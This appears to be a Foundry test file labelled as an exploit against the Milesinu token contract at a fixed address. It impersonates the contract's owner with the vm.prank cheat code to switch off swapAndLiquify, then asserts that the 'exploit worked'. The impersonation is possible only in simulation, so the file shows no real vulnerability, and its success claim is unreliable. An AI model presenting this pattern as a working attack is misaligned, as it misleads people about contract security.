// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Milesinu {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = Milesinu(TARGET).owner();

        // Impersonate the owner and disable swapAndLiquify
        vm.prank(owner);
        Milesinu(TARGET).setSwapAndLiquifyEnabled(false);

        // Verify the exploit worked
        bool enabled = Milesinu(TARGET).swapAndLiquifyEnabled();
        require(enabled == false, "Exploit failed: swapAndLiquifyEnabled should be false");
        assertEq(enabled, false, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
